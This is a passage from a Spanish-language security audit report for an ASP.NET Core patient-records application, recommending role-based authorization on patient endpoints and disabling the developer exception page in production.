   [Authorize(Roles = "Admin, Usuario")]
   public List<PacienteCLS> ListarPacientes() { ... }
   
   [Authorize(Roles = "Admin")]
   [HttpPost]
   public int GuardarPaciente(PacienteCLS obj) { ... }
   
   [Authorize(Roles = "Admin")]
   [HttpPost]
   public int EliminarPaciente(int id) { ... }
   ```

### 8.4 — Manejo de Errores (Prioridad: HIGH)

1. Deshabilitar `DeveloperExceptionPageMiddleware` en producción.
2. En `Program.cs`:
   ```csharp
   if (!app.Environment.IsDevelopment())
   {
       app.UseExceptionHandler("/Home/Error");
   }
   ```
   Verificar que la variable de entorno `ASPNETCORE_ENVIRONMENT` no sea `Development` en producción.

---

> [!NOTE]
> Todas las evidencias de pruebas fueron generadas en el entorno Docker local del proyecto (`http://localhost:5076`). Los resultados son reproducibles ejecutando los comandos indicados en cada caso de prueba.
